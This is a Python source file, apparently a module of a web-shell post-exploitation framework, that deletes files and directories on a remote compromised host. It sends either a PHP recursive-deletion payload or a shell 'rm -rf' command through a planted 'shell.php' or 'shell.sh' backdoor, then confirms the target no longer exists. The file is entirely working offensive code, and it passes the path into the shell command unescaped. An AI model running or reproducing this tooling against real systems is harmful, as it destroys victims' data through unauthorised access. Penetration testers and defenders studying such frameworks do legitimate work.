

from core.moduleguess import ModuleGuess
from core.moduleexception import ModuleException, ProbeSucceed, ProbeException, ExecutionException
from core.argparse import ArgumentParser

WARN_NO_SUCH_FILE = 'No such file or permission denied'
WARN_DELETE_FAIL = 'Cannot remove, check permission or recursion'
WARN_DELETE_OK = 'File deleted'

class Rm(ModuleGuess):
    '''Remove remote files and folders'''


    def _set_vectors(self):
        self.vectors.add_vector('php_rmdir', 'shell.php', """
    function rmfile($dir) {
    if (is_dir("$dir")) rmdir("$dir");
    else { unlink("$dir"); }
    }
    function exists($path) {
    return (file_exists("$path") || is_link("$path"));
    }
    function rrmdir($recurs,$dir) {
        if($recurs=="1") {
            if (is_dir("$dir")) {
                $objects = scandir("$dir");
                foreach ($objects as $object) {
                if ($object != "." && $object != "..") {
                if (filetype($dir."/".$object) == "dir") rrmdir($recurs, $dir."/".$object); else unlink($dir."/".$object);
                }
                }
                reset($objects);
                rmdir("$dir");
            }
            else rmfile("$dir");
        }
        else rmfile("$dir");
    }
    $recurs="$recursive"; $path="$rpath";
    if(exists("$path")) 
    rrmdir("$recurs", "$path");""")
        self.vectors.add_vector('rm', 'shell.sh', "rm $recursive $rpath")

    
    def _set_args(self):
        self.argparser.add_argument('rpath', help='Remote starting path')
        self.argparser.add_argument('-recursive', help='Remove recursively', action='store_true')
        self.argparser.add_argument('-vector', choices = self.vectors.keys())


    def _prepare(self):
        
        self._result = False
        self.modhandler.load('file.check').run([ self.args['rpath'], 'exists' ])
        if not self.modhandler.load('file.check')._result:
            raise ProbeException(self.name, WARN_NO_SUCH_FILE)        


    def _prepare_vector(self):
        
        self.formatted_args = { 'rpath' : self.args['rpath'] }
        
        if self.current_vector.name == 'rm':
            self.formatted_args['recursive'] = '-rf' if self.args['recursive'] else ''
        else:
            self.formatted_args['recursive'] = '1' if self.args['recursive'] else ''
            
            
    def _verify_vector_execution(self):
        self.modhandler.load('file.check').run([ self.args['rpath'], 'exists' ])
        result = self.modhandler.load('file.check')._result
        
        if result == False:
            self._result = True
            raise ProbeSucceed(self.name, WARN_DELETE_OK)
        
    def _verify(self):
        raise ProbeException(self.name, WARN_DELETE_FAIL)
    
    def _stringify_result(self):
        self._output = ''